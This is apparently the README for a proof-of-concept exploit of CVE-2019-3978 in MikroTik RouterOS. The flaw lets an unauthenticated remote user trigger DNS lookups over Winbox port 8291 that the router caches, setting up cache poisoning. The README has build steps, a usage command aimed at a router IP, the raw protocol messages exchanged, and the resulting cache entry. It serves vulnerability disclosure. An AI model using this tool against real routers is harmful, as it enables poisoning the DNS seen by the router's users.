# Unauthenticated DNS request via Winbox

RouterOS before 6.45.7 (stable) and 6.44.6 (Long-term) allowed an unauthenticated remote user trigger DNS requests to a user specified DNS server via port 8291 (winbox). The DNS response then gets cached by RouterOS, setting up a perfect situation for unauthenticated DNS cache poisoning. This is assigned CVE-2019-3978.

This PoC takes a target ip/port (router) and a DNS server (e.g. 8.8.8.8). The PoC will always send a DNS request for example.com. In the following write up, I detail how to use this to poison the routers cache:

* https://medium.com/tenable-techblog/routeros-chain-to-root-f4e0b07c0b21

Note that the writup focuses on router's configured *without* the DNS server enabled. Obviously this attack is significantly more powerful when downstream clients use the router as a DNS server.

## What are the build dependencies?

This requires:

* Boost 1.66 or higher
* cmake

## How do I build this jawn?

Just normal cmake. Try this:

```sh
mkdir build
cd build
cmake ..
make
```

Resolve dependencies as needed.

## Usage Example

```sh
albinolobster@ubuntu:~/routeros/poc/winbox_dns_request/build$ ./winbox_dns_request -i 192.168.1.50 -p 8291 -s 8.8.8.8
-> {bff0005:1,u1:134744072,uff0006:1,uff0007:3,s3:'example.com',Uff0001:[14]}
<- {u4:584628317,uff0003:2,uff0006:1,s3:'example.com',U6:[584628317],U7:[21496],Uff0001:[],Uff0002:[14],S5:['example.com']}
albinolobster@ubuntu:~/routeros/poc/winbox_dns_request/build$ ssh admin@192.168.1.50
...
[admin@MikroTik] > ip dns cache print
Flags: S - static 
 #   NAME                               ADDRESS                                                              TTL         
 0   example.com                        93.184.216.34                                                        5h57m57s    
[admin@MikroTik] > 
```
